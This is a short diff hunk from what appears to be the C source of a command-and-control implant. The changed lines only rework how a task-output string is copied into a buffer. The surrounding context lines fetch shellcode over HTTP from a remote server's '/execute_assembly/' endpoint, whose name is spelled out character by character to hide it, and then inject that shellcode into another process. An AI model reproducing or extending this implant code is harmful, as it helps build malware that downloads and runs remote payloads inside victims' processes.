@@ -327,7 +327,13 @@ void myMain()
             WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
             LPVOID shellcode = httpGetExecutable(api, &dwShellcodeSize, cAssemblyEndpoint, wServer, port);
             ((INJECTINTOPROCESS)PEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, (LPCSTR)lpApplicationName);
-            taskOutput = ((CALLOC)api->calloc)(myStrlenA(TASK_EXECUTE_ASSEMBLY)+1, sizeof(CHAR));  TASK_EXECUTE_ASSEMBLY;
+            taskOutput = ((CALLOC)api->calloc)(myStrlenA(TASK_EXECUTE_ASSEMBLY)+1, sizeof(CHAR));
+            if (taskOutput != NULL) {
+                for (int i = 0; i < myStrlenA(TASK_EXECUTE_ASSEMBLY)+1; i++)
+                {
+                    taskOutput[i] = TASK_EXECUTE_ASSEMBLY[i];
+                }
+            }
         }
         else
         {
